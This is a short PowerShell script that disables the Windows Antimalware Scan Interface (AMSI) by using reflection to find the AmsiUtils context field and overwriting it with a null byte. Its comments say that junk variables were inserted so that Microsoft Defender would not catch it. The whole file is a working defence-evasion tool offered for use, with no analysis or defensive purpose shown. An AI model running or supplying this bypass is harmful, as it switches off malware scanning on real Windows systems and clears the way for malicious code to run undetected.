# This will disable AMSI by corrupting the AmsiContext header
# Three lines of random variables have been added that at the time of writing prevented it getting caught by Defender
foreach($i in [Ref].Assembly.GetTypes()){if($i.Name -like "*siU"+"*"+"ils"){$utilFunctions=$i.GetFields('NonPublic,Static')}};
$morecode="asdaggwrwagrwwefeagwg"
foreach($func in $utilFunctions){if($func.Name -like "*Context"){$addr=$func.GetValue($null)}};
$deadc0de=451234123512315235632345
[Intptr]$pointer=$addr;
$deadb33f="string1234234531235"
[Int32[]]$nullByte=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($nullByte,0,$pointer,1);
